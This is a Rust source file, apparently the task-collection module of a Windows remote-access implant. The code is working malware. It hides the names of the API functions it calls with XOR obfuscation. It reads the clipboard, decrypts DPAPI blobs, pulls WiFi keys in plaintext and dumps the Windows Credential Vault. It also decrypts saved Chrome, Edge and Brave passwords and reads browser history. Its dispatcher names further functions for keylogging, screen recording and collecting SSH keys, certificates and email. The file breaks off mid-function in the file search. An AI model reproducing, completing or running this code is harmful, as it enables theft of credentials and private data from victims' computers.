//! Collection — Phase 4.
//! Task type: "collect", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_collect(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_collect_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("collect: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_collect_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("collect: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("collect: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "clipboard"      => collect_clipboard(),
        "dpapi"          => collect_dpapi(&v),
        "wifi"           => collect_wifi(),
        "vault"          => collect_vault(),
        "browser-creds"  => collect_browser_creds(&v),
        "browser-history"=> collect_browser_history(&v),
        "file-search"    => collect_file_search(&v),
        "screen-record"  => collect_screen_record(&v),
        "keylog-start"   => keylog_start(),
        "keylog-stop"    => keylog_stop(),
        "keylog-dump"    => keylog_dump(),
        "ssh-keys"       => collect_ssh_keys(),
        "certs"          => collect_certs(),
        "email"          => collect_email(),
        other => TaskOutput::failure(&format!("collect: unknown method: {other}")),
    }
}

// ── Clipboard capture ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn collect_clipboard() -> TaskOutput {
    let u32h = crate::loader::get_module_base(
        crate::obfs::dec(&[0x2F,0x29,0x3F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    let user32 = if u32h != 0 { u32h } else {
        use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
        let name = crate::obfs::dec(&[0x2F,0x29,0x3F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
        (unsafe { LoadLibraryA(name.as_ptr()) }) as usize
    };
    if user32 == 0 { return TaskOutput::failure("clipboard: user32 not found"); }

    type OpenClipboardFn    = unsafe extern "system" fn(isize) -> i32;
    type GetClipboardDataFn = unsafe extern "system" fn(u32) -> isize;
    type CloseClipboardFn   = unsafe extern "system" fn() -> i32;
    type GlobalLockFn       = unsafe extern "system" fn(isize) -> *const u8;
    type GlobalUnlockFn     = unsafe extern "system" fn(isize) -> i32;
    type GlobalSizeFn       = unsafe extern "system" fn(isize) -> usize;

    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
    let k32h = crate::loader::get_module_base(
        crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    ) as isize;
    if k32h == 0 { return TaskOutput::failure("clipboard: kernel32 not found"); }

    // OpenClipboard, GetClipboardData, CloseClipboard → user32 (direct exports, get_export_by_name ok)
    // GlobalLock, GlobalUnlock, GlobalSize → forwarded kernel32→KERNELBASE; use GetProcAddress
    let p_open  = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x15,0x2A,0x3F,0x34,0x19,0x36,0x33,0x2A,0x38,0x35,0x3B,0x28,0x3E,0x5A]).as_ptr()) };
    let p_get   = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x1D,0x3F,0x2E,0x19,0x36,0x33,0x2A,0x38,0x35,0x3B,0x28,0x3E,0x1E,0x3B,0x2E,0x3B,0x5A]).as_ptr()) };
    let p_close = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x19,0x36,0x35,0x29,0x3F,0x19,0x36,0x33,0x2A,0x38,0x35,0x3B,0x28,0x3E,0x5A]).as_ptr()) };
    let p_lock  = unsafe { GetProcAddress(k32h, b"GlobalLock\0".as_ptr()) }.map(|f| f as usize);
    let p_unlock= unsafe { GetProcAddress(k32h, b"GlobalUnlock\0".as_ptr()) }.map(|f| f as usize);
    let p_size  = unsafe { GetProcAddress(k32h, b"GlobalSize\0".as_ptr()) }.map(|f| f as usize);

    match (p_open, p_get, p_close, p_lock, p_unlock, p_size) {
        (Some(a), Some(b), Some(c), Some(d), Some(e), Some(f)) => {
            let fn_open:   OpenClipboardFn    = unsafe { core::mem::transmute(a) };
            let fn_get:    GetClipboardDataFn = unsafe { core::mem::transmute(b) };
            let fn_close:  CloseClipboardFn   = unsafe { core::mem::transmute(c) };
            let fn_lock:   GlobalLockFn       = unsafe { core::mem::transmute(d) };
            let fn_unlock: GlobalUnlockFn     = unsafe { core::mem::transmute(e) };
            let fn_size:   GlobalSizeFn       = unsafe { core::mem::transmute(f) };

            if unsafe { fn_open(0) } == 0 {
                return TaskOutput::failure("clipboard: OpenClipboard failed");
            }
            const CF_UNICODETEXT: u32 = 13;
            const CF_TEXT: u32 = 1;
            let hmem = unsafe { fn_get(CF_UNICODETEXT) };
            if hmem == 0 {
                let hmem = unsafe { fn_get(CF_TEXT) };
                if hmem == 0 {
                    unsafe { fn_close() };
                    return TaskOutput::success(b"(clipboard empty or non-text format)".to_vec());
                }
                let ptr = unsafe { fn_lock(hmem) };
                let sz  = unsafe { fn_size(hmem) };
                let data = unsafe { core::slice::from_raw_parts(ptr, sz.saturating_sub(1)) };
                let text = String::from_utf8_lossy(data).into_owned();
                unsafe { fn_unlock(hmem); fn_close() };
                return TaskOutput::success(text.into_bytes());
            }
            let ptr = unsafe { fn_lock(hmem) } as *const u16;
            let sz  = unsafe { fn_size(hmem) } / 2;
            let wchars = unsafe { core::slice::from_raw_parts(ptr, sz.saturating_sub(1)) };
            let text = String::from_utf16_lossy(wchars);
            unsafe { fn_unlock(hmem); fn_close() };
            TaskOutput::success(text.into_bytes())
        }
        _ => TaskOutput::failure("clipboard: fn resolve failed"),
    }
}

// ── DPAPI decrypt ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub fn dpapi_decrypt(ciphertext: &[u8]) -> Option<Vec<u8>> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    // "crypt32.dll\0" XOR 0x5A
    let crypt32 = {
        let name = crate::obfs::dec(&[0x39,0x28,0x23,0x2A,0x2E,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
        (unsafe { LoadLibraryA(name.as_ptr()) }) as usize
    };
    if crypt32 == 0 { return None; }

    // "CryptUnprotectData\0" XOR 0x5A
    let fn_ptr = unsafe { crate::loader::get_export_by_name(crypt32,
        crate::obfs::dec(&[0x19,0x28,0x23,0x2A,0x2E,0x0F,0x34,0x2A,0x28,0x35,0x2E,0x3F,0x39,0x2E,0x1E,0x3B,0x2E,0x3B,0x5A]).as_ptr()
    )};
    let fn_ptr = fn_ptr?;

    #[repr(C)]
    struct DataBlob { cb_data: u32, pb_data: *mut u8 }

    type CryptUnprotectDataFn = unsafe extern "system" fn(
        *const DataBlob, *mut *mut u16, *const DataBlob,
        *mut u8, *mut u8, u32, *mut DataBlob,
    ) -> i32;

    let f: CryptUnprotectDataFn = unsafe { core::mem::transmute(fn_ptr) };

    let input = DataBlob { cb_data: ciphertext.len() as u32, pb_data: ciphertext.as_ptr() as *mut u8 };
    let mut output = DataBlob { cb_data: 0, pb_data: core::ptr::null_mut() };

    let ok = unsafe { f(&input, core::ptr::null_mut(), core::ptr::null(),
        core::ptr::null_mut(), core::ptr::null_mut(), 0, &mut output) };
    if ok == 0 || output.pb_data.is_null() { return None; }

    let plain = unsafe { core::slice::from_raw_parts(output.pb_data, output.cb_data as usize) }.to_vec();
    // LocalFree not exported in windows-sys 0.52 Win32_System_Memory — load dynamically
    let k32 = crate::loader::get_module_base(
        crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if k32 != 0 {
        if let Some(p) = unsafe { crate::loader::get_export_by_name(k32,
            crate::obfs::dec(&[0x16,0x35,0x39,0x3B,0x36,0x1C,0x28,0x3F,0x3F,0x5A]).as_ptr())
        } {
            type LocalFreeFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> *mut core::ffi::c_void;
            let fn_free: LocalFreeFn = unsafe { core::mem::transmute(p) };
            unsafe { fn_free(output.pb_data as *mut _) };
        }
    }
    Some(plain)
}

#[cfg(target_os = "windows")]
fn collect_dpapi(v: &serde_json::Value) -> TaskOutput {
    use base64::Engine;
    let blob_b64 = match v.get("blob").and_then(|s| s.as_str()) {
        Some(s) => s, None => return TaskOutput::failure("collect/dpapi: missing blob"),
    };
    let blob = match base64::engine::general_purpose::STANDARD.decode(blob_b64) {
        Ok(b)  => b,
        Err(e) => return TaskOutput::failure(&format!("collect/dpapi: base64: {e}")),
    };
    match dpapi_decrypt(&blob) {
        Some(plain) => TaskOutput::success(plain),
        None        => TaskOutput::failure("collect/dpapi: CryptUnprotectData failed"),
    }
}

// ── WiFi password extraction ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn collect_wifi() -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    // "wlanapi.dll\0" XOR 0x5A
    let wlan = {
        let name = crate::obfs::dec(&[0x2D,0x36,0x3B,0x34,0x3B,0x2A,0x33,0x74,0x3E,0x36,0x36,0x5A]);
        (unsafe { LoadLibraryA(name.as_ptr()) }) as usize
    };
    if wlan == 0 { return TaskOutput::failure("wifi: wlanapi.dll not available"); }

    type WlanOpenHandleFn       = unsafe extern "system" fn(u32, *mut u8, *mut u32, *mut isize) -> u32;
    type WlanEnumInterfacesFn   = unsafe extern "system" fn(isize, *mut u8, *mut *mut u8) -> u32;
    type WlanGetProfileFn       = unsafe extern "system" fn(isize, *const u8, *const u16, *mut u8, *mut *mut u16, *mut u32, *mut u32) -> u32;
    type WlanCloseHandleFn      = unsafe extern "system" fn(isize, *mut u8) -> u32;
    type WlanFreeMemoryFn       = unsafe extern "system" fn(*mut u8);

    macro_rules! wlan_fn { ($enc:expr, $ty:ty) => { {
        let p = unsafe { crate::loader::get_export_by_name(wlan, crate::obfs::dec($enc).as_ptr()) };
        match p { Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) }, None => return TaskOutput::failure("wifi: fn resolve failed") }
    }}}

    let fn_open  = wlan_fn!(&[0x0D,0x36,0x3B,0x34,0x15,0x2A,0x3F,0x34,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A], WlanOpenHandleFn);
    let fn_enum  = wlan_fn!(&[0x0D,0x36,0x3B,0x34,0x1F,0x34,0x2F,0x37,0x13,0x34,0x2E,0x3F,0x28,0x3C,0x3B,0x39,0x3F,0x29,0x5A], WlanEnumInterfacesFn);
    let fn_get   = wlan_fn!(&[0x0D,0x36,0x3B,0x34,0x1D,0x3F,0x2E,0x0A,0x28,0x35,0x3C,0x33,0x36,0x3F,0x5A], WlanGetProfileFn);
    let fn_close = wlan_fn!(&[0x0D,0x36,0x3B,0x34,0x19,0x36,0x35,0x29,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A], WlanCloseHandleFn);
    let fn_free  = wlan_fn!(&[0x0D,0x36,0x3B,0x34,0x1C,0x28,0x3F,0x3F,0x17,0x3F,0x37,0x35,0x28,0x23,0x5A], WlanFreeMemoryFn);

    let mut cur_ver: u32 = 0;
    let mut handle: isize = 0;
    if unsafe { fn_open(2, core::ptr::null_mut(), &mut cur_ver, &mut handle) } != 0 || handle == 0 {
        return TaskOutput::failure("wifi: WlanOpenHandle failed");
    }

    let mut iface_list: *mut u8 = core::ptr::null_mut();
    if unsafe { fn_enum(handle, core::ptr::null_mut(), &mut iface_list) } != 0 || iface_list.is_null() {
        unsafe { fn_close(handle, core::ptr::null_mut()) };
        return TaskOutput::failure("wifi: WlanEnumInterfaces failed");
    }

    // WLAN_INTERFACE_INFO_LIST: dwNumberOfItems (u32), dwIndex (u32), then array of WLAN_INTERFACE_INFO (0x208 bytes each)
    let num_ifaces = unsafe { *(iface_list as *const u32) } as usize;
    let mut out = String::new();

    // Get profile list per interface using shell (avoids complex struct parsing)
    // Profile names from `netsh wlan show profiles`
    let profiles_output = shell_run("netsh wlan show profiles");
    let profile_names: Vec<String> = match profiles_output {
        Ok(bytes) => {
            let text = String::from_utf8_lossy(&bytes);
            text.lines()
                .filter_map(|line| {
                    let l = line.trim();
                    // Match "    All User Profile     : <name>" or similar
                    if l.starts_with("All User Profile") || l.contains("User Profile") {
                        l.split(':').nth(1).map(|s| s.trim().to_string())
                    } else { None }
                })
                .filter(|s| !s.is_empty())
                .collect()
        }
        Err(_) => vec![],
    };

    // For each interface GUID and each profile, call WlanGetProfile
    // WLAN_INTERFACE_INFO starts at iface_list+8, each entry is 0x208 bytes
    // First 16 bytes = GUID (InterfaceGuid)
    for i in 0..num_ifaces {
        let entry_ptr = unsafe { iface_list.add(8 + i * 0x208) };
        let guid_bytes = unsafe { core::slice::from_raw_parts(entry_ptr, 16) };

        for profile_name in &profile_names {
            let pname_w: Vec<u16> = profile_name.encode_utf16().chain(core::iter::once(0)).collect();
            let mut xml_ptr: *mut u16 = core::ptr::null_mut();
            let mut flags: u32 = 0x04; // WLAN_PROFILE_GET_PLAINTEXT_KEY
            let mut access: u32 = 0;
            let ret = unsafe { fn_get(handle, guid_bytes.as_ptr(), pname_w.as_ptr(), core::ptr::null_mut(), &mut xml_ptr, &mut flags, &mut access) };
            if ret == 0 && !xml_ptr.is_null() {
                // Parse XML to extract PSK
                let mut len = 0usize;
                while unsafe { *xml_ptr.add(len) } != 0 { len += 1; }
                let xml = String::from_utf16_lossy(unsafe { core::slice::from_raw_parts(xml_ptr, len) });
                let key = extract_xml_value(&xml, "keyMaterial").unwrap_or_else(|| "(encrypted/hidden)".into());
                let ssid = extract_xml_value(&xml, "name").unwrap_or_else(|| profile_name.clone());
                out.push_str(&format!("SSID: {ssid}\tKey: {key}\n"));
                unsafe { fn_free(xml_ptr as *mut u8) };
            }
        }
    }

    unsafe { fn_free(iface_list) };
    unsafe { fn_close(handle, core::ptr::null_mut()) };

    if out.is_empty() {
        TaskOutput::success(b"wifi: no profiles found or no key access (need admin)".to_vec())
    } else {
        TaskOutput::success(out.into_bytes())
    }
}

fn extract_xml_value(xml: &str, tag: &str) -> Option<String> {
    let open  = format!("<{tag}>");
    let close = format!("</{tag}>");
    let start = xml.find(&open)? + open.len();
    let end   = xml[start..].find(&close)? + start;
    Some(xml[start..end].to_string())
}

// ── Windows Credential Vault ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn collect_vault() -> TaskOutput {
    let adv = crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if adv == 0 { return TaskOutput::failure("vault: advapi32 not found"); }

    #[repr(C)]
    struct Credential {
        flags:          u32,
        cred_type:      u32,
        target_name:    *mut u16,
        comment:        *mut u16,
        last_written:   [u64; 1],
        credential_blob_size: u32,
        credential_blob: *mut u8,
        persist:        u32,
        attribute_count: u32,
        attributes:     *mut u8,
        target_alias:   *mut u16,
        user_name:      *mut u16,
    }

    type CredEnumerateWFn = unsafe extern "system" fn(*const u16, u32, *mut u32, *mut *mut *mut Credential) -> i32;
    type CredFreeFn       = unsafe extern "system" fn(*mut u8);

    let p_enum = unsafe { crate::loader::get_export_by_name(adv,
        crate::obfs::dec(&[0x19,0x28,0x3F,0x3E,0x1F,0x34,0x2F,0x37,0x3F,0x28,0x3B,0x2E,0x3F,0x0D,0x5A]).as_ptr())
    };
    let p_free = unsafe { crate::loader::get_export_by_name(adv,
        crate::obfs::dec(&[0x19,0x28,0x3F,0x3E,0x1C,0x28,0x3F,0x3F,0x5A]).as_ptr())
    };

    let (fn_enum, fn_free) = match (p_enum, p_free) {
        (Some(a), Some(b)) => (
            unsafe { core::mem::transmute::<_, CredEnumerateWFn>(a) },
            unsafe { core::mem::transmute::<_, CredFreeFn>(b) },
        ),
        _ => return TaskOutput::failure("vault: fn resolve failed"),
    };

    let mut count: u32 = 0;
    let mut creds: *mut *mut Credential = core::ptr::null_mut();
    let ok = unsafe { fn_enum(core::ptr::null(), 0, &mut count, &mut creds) };
    if ok == 0 {
        return TaskOutput::failure("vault: CredEnumerateW failed (no creds or access denied)");
    }

    let mut out = String::from("Target\tUsername\tSecret\n");
    for i in 0..count as usize {
        let c = unsafe { &**creds.add(i) };
        let target = wide_to_str(c.target_name);
        let user   = wide_to_str(c.user_name);
        let secret = if c.credential_blob_size > 0 && !c.credential_blob.is_null() {
            let bytes = unsafe { core::slice::from_raw_parts(c.credential_blob, c.credential_blob_size as usize) };
            // Try UTF-16 decode (typical for Windows passwords stored as Unicode)
            if bytes.len() % 2 == 0 {
                let words: Vec<u16> = bytes.chunks(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();
                String::from_utf16_lossy(&words).to_string()
            } else {
                String::from_utf8_lossy(bytes).to_string()
            }
        } else { String::new() };
        out.push_str(&format!("{target}\t{user}\t{secret}\n"));
    }

    unsafe { fn_free(creds as *mut u8) };
    TaskOutput::success(out.into_bytes())
}

fn wide_to_str(ptr: *mut u16) -> String {
    if ptr.is_null() { return String::new(); }
    let mut len = 0usize;
    while unsafe { *ptr.add(len) } != 0 { len += 1; }
    String::from_utf16_lossy(unsafe { core::slice::from_raw_parts(ptr, len) })
}

// ── Browser credentials (Chrome/Edge) ────────────────────────────────────────
//
// 1. Read Local State JSON to get AES key (DPAPI-wrapped)
// 2. DPAPI decrypt the key
// 3. Copy Login Data SQLite to temp
// 4. Parse the SQLite3 file to extract encrypted passwords
// 5. AES-256-GCM decrypt each with the key
// 6. Return plaintext as TSV

#[cfg(target_os = "windows")]
fn collect_browser_creds(v: &serde_json::Value) -> TaskOutput {
    let browser = v.get("browser").and_then(|s| s.as_str()).unwrap_or("chrome");
    let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();

    let (state_path, login_path) = match browser.to_ascii_lowercase().as_str() {
        "edge"   => (
            format!("{local_appdata}\\Microsoft\\Edge\\User Data\\Local State"),
            format!("{local_appdata}\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
        ),
        "brave"  => (
            format!("{local_appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Local State"),
            format!("{local_appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"),
        ),
        _        => (
            format!("{local_appdata}\\Google\\Chrome\\User Data\\Local State"),
            format!("{local_appdata}\\Google\\Chrome\\User Data\\Default\\Login Data"),
        ),
    };

    // Get AES key from Local State
    let aes_key = match get_browser_aes_key(&state_path) {
        Some(k) => k,
        None    => return TaskOutput::failure(&format!("browser-creds: failed to get AES key from {state_path}")),
    };

    // Copy Login Data to temp (browser may lock the file)
    let tmp = format!("{local_appdata}\\Temp\\~ldb_{}.tmp", std::process::id());
    if std::fs::copy(&login_path, &tmp).is_err() {
        // Try with volume shadow copy approach via shell
        let cmd = format!("copy /Y \"{login_path}\" \"{tmp}\" 2>nul");
        let _ = shell_run(&cmd);
    }

    let db_bytes = match std::fs::read(&tmp) {
        Ok(b)  => { let _ = std::fs::remove_file(&tmp); b }
        Err(e) => return TaskOutput::failure(&format!("browser-creds: cannot read Login Data: {e}")),
    };

    // Parse SQLite3 and extract logins
    let logins = parse_sqlite_logins(&db_bytes);
    if logins.is_empty() {
        return TaskOutput::success(b"browser-creds: no login records found".to_vec());
    }

    let mut out = String::from("URL\tUsername\tPassword\n");
    for (url, user, enc_pass) in logins {
        let pass = decrypt_browser_password(&enc_pass, &aes_key).unwrap_or_else(|| "(decrypt failed)".into());
        out.push_str(&format!("{url}\t{user}\t{pass}\n"));
    }
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn get_browser_aes_key(state_path: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    let state = std::fs::read_to_string(state_path).ok()?;
    // Find "encrypted_key":"<b64>" in JSON
    let marker = "\"encrypted_key\":\"";
    let start  = state.find(marker)? + marker.len();
    let end    = state[start..].find('"')? + start;
    let b64    = &state[start..end];
    let mut enc = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
    // First 5 bytes are "DPAPI"
    if enc.len() <= 5 { return None; }
    let blob = enc.split_off(5);
    dpapi_decrypt(&blob)
}

fn parse_sqlite_logins(db: &[u8]) -> Vec<(String, String, Vec<u8>)> {
    if db.len() < 100 { return vec![]; }
    if &db[0..6] != b"SQLite" { return vec![]; }

    let page_size = {
        let raw = u16::from_be_bytes([db[16], db[17]]) as usize;
        if raw == 1 { 65536 } else { raw }
    };
    if page_size == 0 || db.len() < page_size { return vec![]; }

    // Find root page of logins table from sqlite_master (page 1)
    let logins_root = find_table_root(db, page_size, b"logins").unwrap_or(0);
    if logins_root == 0 { return vec![]; }

    extract_login_records(db, page_size, logins_root)
}

fn find_table_root(db: &[u8], page_size: usize, table_name: &[u8]) -> Option<u32> {
    // Page 1 starts at byte 0, sqlite_master leaf starts at byte 100 (after file header)
    read_btree_leaf_records(db, page_size, 1, &mut |_row_id, payload| {
        // sqlite_master record: type(text), name(text), tbl_name(text), rootpage(int), sql(text)
        let mut pos = 0usize;
        let hdr_size = read_varint(payload, &mut pos) as usize;
        if hdr_size == 0 || hdr_size > payload.len() { return None; }
        let mut types = Vec::new();
        while pos < hdr_size { types.push(read_varint(payload, &mut pos)); }

        let mut val_pos = hdr_size;
        let mut values: Vec<&[u8]> = Vec::new();
        for &t in &types {
            let (val, len) = read_value(payload, val_pos, t)?;
            values.push(val);
            val_pos += len;
        }
        if values.len() < 4 { return None; }
        if values[1] == table_name {
            let b = values[3];
            let rootpage = match b.len() {
                1 => b[0] as u32,
                2 => u16::from_be_bytes([b[0], b[1]]) as u32,
                3 => u32::from_be_bytes([0, b[0], b[1], b[2]]),
                4 => u32::from_be_bytes([b[0], b[1], b[2], b[3]]),
                _ => return None,
            };
            return Some(rootpage);
        }
        None
    })
}

fn extract_login_records(db: &[u8], page_size: usize, root_page: u32) -> Vec<(String, String, Vec<u8>)> {
    let mut results = Vec::new();
    read_btree_leaf_records(db, page_size, root_page, &mut |_row_id, payload| -> Option<()> {
        let mut pos = 0usize;
        let hdr_size = read_varint(payload, &mut pos) as usize;
        if hdr_size == 0 || hdr_size > payload.len() { return None; }
        let mut types = Vec::new();
        while pos < hdr_size { types.push(read_varint(payload, &mut pos)); }

        let mut val_pos = hdr_size;
        let mut values: Vec<Vec<u8>> = Vec::new();
        for &t in &types {
            let (val, len) = read_value(payload, val_pos, t)?;
            values.push(val.to_vec());
            val_pos += len;
        }
        // Chrome logins table columns (approximate order):
        // 0:id, 1:origin_url, 2:action_url, 3:username_element, 4:username_value,
        // 5:password_element, 6:password_value, ...
        if values.len() >= 7 {
            let url  = String::from_utf8_lossy(&values[1]).to_string();
            let user = String::from_utf8_lossy(&values[4]).to_string();
            let enc  = values[6].clone();
            if !enc.is_empty() {
                results.push((url, user, enc));
            }
        }
        None::<()>
    });
    results
}

fn read_varint(data: &[u8], pos: &mut usize) -> u64 {
    let mut val: u64 = 0;
    for _ in 0..9 {
        if *pos >= data.len() { break; }
        let b = data[*pos]; *pos += 1;
        val = (val << 7) | (b & 0x7F) as u64;
        if b & 0x80 == 0 { break; }
    }
    val
}

fn read_value<'a>(data: &'a [u8], pos: usize, serial_type: u64) -> Option<(&'a [u8], usize)> {
    match serial_type {
        0 => Some((&[], 0)),
        1 => data.get(pos..pos+1).map(|v| (v, 1)),
        2 => data.get(pos..pos+2).map(|v| (v, 2)),
        3 => data.get(pos..pos+3).map(|v| (v, 3)),
        4 => data.get(pos..pos+4).map(|v| (v, 4)),
        5 => data.get(pos..pos+6).map(|v| (v, 6)),
        6 | 7 => data.get(pos..pos+8).map(|v| (v, 8)),
        8 | 9 => Some((&[], 0)), // integer 0 or 1
        t if t >= 12 && t % 2 == 0 => {
            let len = ((t - 12) / 2) as usize;
            data.get(pos..pos+len).map(|v| (v, len))
        }
        t if t >= 13 && t % 2 == 1 => {
            let len = ((t - 13) / 2) as usize;
            data.get(pos..pos+len).map(|v| (v, len))
        }
        _ => None,
    }
}

fn read_btree_leaf_records<T>(
    db: &[u8],
    page_size: usize,
    page_num: u32,
    visitor: &mut dyn FnMut(i64, &[u8]) -> Option<T>,
) -> Option<T> {
    let page_idx = (page_num as usize).saturating_sub(1);
    let page_off = page_idx * page_size;
    let page = db.get(page_off..page_off + page_size)?;

    let hdr_off = if page_num == 1 { 100 } else { 0 };
    let page_type = *page.get(hdr_off)?;

    if page_type == 0x0D {
        let num_cells = u16::from_be_bytes([*page.get(hdr_off+3)?, *page.get(hdr_off+4)?]) as usize;
        let cell_ptr_arr_off = hdr_off + 8;
        for i in 0..num_cells {
            let ptr_off = cell_ptr_arr_off + i * 2;
            let cell_off = u16::from_be_bytes([*page.get(ptr_off)?, *page.get(ptr_off+1)?]) as usize;
            let cell = page.get(cell_off..)?;
            let mut pos = 0usize;
            let payload_len = read_varint(cell, &mut pos) as usize;
            let row_id = read_varint(cell, &mut pos) as i64;
            let inline = cell.get(pos..pos + payload_len.min(cell.len() - pos))?;
            if let Some(result) = visitor(row_id, inline) {
                return Some(result);
            }
        }
    } else if page_type == 0x05 {
        let num_cells = u16::from_be_bytes([*page.get(hdr_off+3)?, *page.get(hdr_off+4)?]) as usize;
        let right_child = u32::from_be_bytes([
            *page.get(hdr_off+8)?, *page.get(hdr_off+9)?, *page.get(hdr_off+10)?, *page.get(hdr_off+11)?,
        ]);
        let cell_ptr_arr_off = hdr_off + 12;
        for i in 0..num_cells {
            let ptr_off = cell_ptr_arr_off + i * 2;
            let cell_off = u16::from_be_bytes([*page.get(ptr_off)?, *page.get(ptr_off+1)?]) as usize;
            let left_child = u32::from_be_bytes([
                *page.get(cell_off)?, *page.get(cell_off+1)?, *page.get(cell_off+2)?, *page.get(cell_off+3)?,
            ]);
            if let Some(r) = read_btree_leaf_records(db, page_size, left_child, visitor) {
                return Some(r);
            }
        }
        if let Some(r) = read_btree_leaf_records(db, page_size, right_child, visitor) {
            return Some(r);
        }
    }
    None
}

fn decrypt_browser_password(enc: &[u8], aes_key: &[u8]) -> Option<String> {
    use aes_gcm::{Aes256Gcm, KeyInit, aead::{Aead, generic_array::GenericArray}};
    // Format: "v10" (3 bytes) + nonce (12 bytes) + ciphertext+tag
    if enc.len() < 3 + 12 + 16 { return None; }
    if &enc[0..3] != b"v10" { return None; }
    let nonce_bytes = &enc[3..15];
    let ciphertext  = &enc[15..];
    let key  = GenericArray::from_slice(aes_key);
    let cipher = Aes256Gcm::new(key);
    let nonce = GenericArray::from_slice(nonce_bytes);
    let plain = cipher.decrypt(nonce, ciphertext).ok()?;
    String::from_utf8(plain).ok()
}

// ── Browser history ───────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn collect_browser_history(v: &serde_json::Value) -> TaskOutput {
    let browser  = v.get("browser").and_then(|s| s.as_str()).unwrap_or("chrome");
    let limit    = v.get("limit").and_then(|n| n.as_u64()).unwrap_or(100);
    let local    = std::env::var("LOCALAPPDATA").unwrap_or_default();

    let history_path = match browser.to_ascii_lowercase().as_str() {
        "edge"  => format!("{local}\\Microsoft\\Edge\\User Data\\Default\\History"),
        "brave" => format!("{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"),
        _       => format!("{local}\\Google\\Chrome\\User Data\\Default\\History"),
    };

    let tmp = format!("{local}\\Temp\\~hist_{}.tmp", std::process::id());
    let cmd = format!("copy /Y \"{history_path}\" \"{tmp}\" 2>nul");
    let _ = shell_run(&cmd);
    let db = match std::fs::read(&tmp) {
        Ok(b) => { let _ = std::fs::remove_file(&tmp); b }
        Err(e) => return TaskOutput::failure(&format!("browser-history: {e}")),
    };

    // Parse `urls` table from History SQLite
    let records = parse_sqlite_urls(&db, limit as usize);
    if records.is_empty() {
        return TaskOutput::success(b"browser-history: no records found".to_vec());
    }
    let mut out = String::from("URL\tTitle\tVisitCount\n");
    for (url, title, count) in records {
        out.push_str(&format!("{url}\t{title}\t{count}\n"));
    }
    TaskOutput::success(out.into_bytes())
}

fn parse_sqlite_urls(db: &[u8], limit: usize) -> Vec<(String, String, i64)> {
    if db.len() < 100 { return vec![]; }
    let page_size = {
        let raw = u16::from_be_bytes([db[16], db[17]]) as usize;
        if raw == 1 { 65536 } else { raw }
    };
    let urls_root = find_table_root(db, page_size, b"urls").unwrap_or(0);
    if urls_root == 0 { return vec![]; }
    let mut results = Vec::new();
    read_btree_leaf_records(db, page_size, urls_root, &mut |_row_id, payload| -> Option<()> {
        if results.len() >= limit { return None; }
        let mut pos = 0usize;
        let hdr_size = read_varint(payload, &mut pos) as usize;
        if hdr_size == 0 || hdr_size > payload.len() { return None; }
        let mut types = Vec::new();
        while pos < hdr_size { types.push(read_varint(payload, &mut pos)); }
        let mut val_pos = hdr_size;
        let mut values: Vec<Vec<u8>> = Vec::new();
        for &t in &types {
            let (v, l) = read_value(payload, val_pos, t)?;
            values.push(v.to_vec());
            val_pos += l;
        }
        // urls table: 0:id, 1:url, 2:title, 3:visit_count, ...
        if values.len() >= 4 {
            let url   = String::from_utf8_lossy(&values[1]).to_string();
            let title = String::from_utf8_lossy(&values[2]).to_string();
            let count = types[3] as i64;
            results.push((url, title, count));
        }
        None::<()>
    });
    results
}

// ── File content search ───────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn collect_file_search(v: &serde_json::Value) -> TaskOutput {
    let root    = v.get("path").and_then(|s| s.as_str()).unwrap_or("C:\\Users");
    let pattern = v.get("pattern").and_then(|s| s.as_str()).unwrap_or("*.txt");
    let grep    = v.get("grep").and_then(|s| s.as_str());
    let max     = v.get("max").and_then(|n| n.as_u64()).unwrap_or(200) as usize;

    let mut found = Vec::new();
    walk_find(root, pattern, grep, max, &mut found);

    if found.is_empty() {
        TaskOutput::success(b"file-search: no matches".to_vec())
    } else {
